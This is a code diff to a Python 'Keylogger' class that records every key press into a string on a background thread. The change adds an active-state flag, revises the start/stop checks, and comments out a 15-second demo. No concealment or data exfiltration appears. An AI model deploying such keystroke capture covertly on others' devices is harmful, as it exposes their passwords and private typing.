@@ -21,6 +21,7 @@ class Keylogger:
     def __init__(self):
         # This stores every key press.
         self.__keylog = ""
+        self.__active = False
         self.__stop = False
         self.__thread = None
         self.__lock = Lock()
@@ -39,21 +40,24 @@ class Keylogger:
                     self.__lock.acquire()
                     self.__keylog += event.name
                     self.__lock.release()
+        self.__active = False
 
 
     def start(self):
-        if self.__thread is not None:
+        if self.__active:
             print("ERROR: Calling start() on keylogger that is already running.", file=stderr)
             exit(1)
+        self.__active = True
         self.__thread = Thread(target=self.__read_keystrokes)
         self.__thread.start()
 
 
     def stop(self):
-        if self.__thread is None:
+        if not self.__active:
             print("ERROR: Calling stop() on keylogger that is not running.", file=stderr)
             exit(1)
         self.__stop = True
+        self.__active = False
     
 
     def get_keylog(self):
@@ -70,11 +74,11 @@ class Keylogger:
         self.__lock.release()
     
 
-if __name__ == "__main__":
-    k = Keylogger()
-    k.start()
-    time.sleep(15)
-    k.stop()
-    print(f"Before: {k.get_keylog()}")
-    k.clear_keylog()
-    print(f"After: {k.get_keylog()}")
+# if __name__ == "__main__":
+#     k = Keylogger()
+#     k.start()
+#     time.sleep(15)
+#     k.stop()
+#     print(f"Before: {k.get_keylog()}")
+#     k.clear_keylog()
+#     print(f"After: {k.get_keylog()}")
